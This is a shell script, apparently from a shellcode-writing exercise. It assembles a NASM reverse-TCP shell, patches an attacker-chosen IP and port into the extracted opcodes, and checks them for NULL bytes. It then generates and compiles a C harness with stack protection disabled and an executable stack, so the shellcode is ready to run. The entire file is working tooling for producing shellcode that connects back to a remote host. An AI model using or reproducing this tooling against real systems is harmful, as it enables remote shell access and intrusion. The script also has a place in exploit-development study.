#!/usr/bin/env sh
#
# Creates a shell_reverse_tcp shellcode
#
# Example
# ./compile_all.sh shell_reverse_tcp 192.168.1.1 12357
#
# If no IP & Port specified, the default ones will be used 192.168.1.1 12357
#
# IP and Port are stored in last 6 bytes in HEX
#

ARG1=$1        # Specify program
ARG2=$2        # Specify IP
ARG3=$3        # Specify port

#
# Check script usage and file existence
#
if [ -z "$ARG1" ]; then
  echo " [I] Please specify program you would like to assemble!"
  echo " [I] Usage example: ./compile_all.sh shell_reverse_tcp 192.168.1.1 12357"
  exit 1;
elif [ -e "$ARG1" ]; then
  if [[ $ARG1 == *nasm* ]]; then
      ARG1=$(echo -ne $ARG1 |sed 's/.....$//g');
     echo $ARG1
  fi
elif [ ! -e "$ARG1".nasm ]; then
  ARG1_GUESS=$(echo $ARG1 |sed 's/.nasm//g')
  if [ -e "$ARG1_GUESS" ]; then
    ARG1=$ARG1_GUESS
  else
    echo " [E] File "$ARG1" does not exist!"
    exit 1;
  fi
fi


#
# Validate nasm source file
#
if ! $(grep -qi ^global $ARG1.nasm 2>/dev/null); then
  echo " [E] The file "$ARG1.nasm" does not appear to be a correct NASM source!"
  exit 1;
fi


#
# Validate and Convert IP to HEX
#
function valid_ip()
{
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && \
           ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

if [ -z "$ARG2" ]; then
  echo " [E] Please specify IP"
  exit 1;
else
  if valid_ip $ARG2; then
    IPHEX=$(printf '%.2x' ${ARG2//./ } | sed 's/../\\x&/g')
  else
    echo " [E] IP is not valid!"
    exit 1;
  fi
fi


#
# Port range check
#
if [ -z "$ARG3" ]; then
  echo " [I] Default port will be used."
  ARG3=12357;
elif ! [[ $ARG3 -ge 1024 && $ARG3 -le 65535 ]]; then
  echo " [E] The port must be in range 1024..65535 !"
  exit 1;
else
  echo " [I] Using custom port: "$ARG3
fi


#
# Assemble and link
#
echo " [+] Assembling "$ARG1".nasm with NASM ..."
nasm -f elf32 -o $ARG1.o $ARG1.nasm && \
echo " [+] Linking "$ARG1".o ..." && \
ld -m elf_i386 -o $ARG1 $ARG1.o && \
echo -e " [+] Generating shellcode with objdump ..." && \
SHELLCODE=$(objdump -d ./$ARG1 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/' |sed 's/$/"/g')


#
# Set the custom port (if any was specified) for the shellcode
#
if [ -z "$ARG3" ]; then
  FULL_SHELLCODE=$(echo $SHELLCODE)
else
  PORT_HEX=$(printf '%.4x' $ARG3 | sed 's/../\\x&/g')
  FULL_SHELLCODE=$(echo -n $SHELLCODE | sed 's/.........................$//' ; echo ${IPHEX}${PORT_HEX}"\"")
fi


#
# Check shellcode for NULLs
#
echo " [+] Checking shellcode for NULLs ..."
if [[ $FULL_SHELLCODE == *00* ]]; then
  echo " [E] Your shellcode contains 00 (NULL) ! Most likely you need to change your IP or port."
  exit 1
fi

echo -ne " [+] Shellcode size is "$(echo -ne $FULL_SHELLCODE|sed 's/\"//g'|wc -c)" bytes\n"
echo $FULL_SHELLCODE


#
# Generate shellcode.c
#
echo " [+] Generating shellcode.c file with the "$ARG1" shellcode ..."
cat > shellcode.c << EOF
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
$FULL_SHELLCODE;

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
EOF


#
# Compile C code with GCC
#
echo " [+] Compiling shellcode.c with GCC ..."
gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode

echo -e " [+] All done! You can run the shellcode now: \n$ ./shellcode"
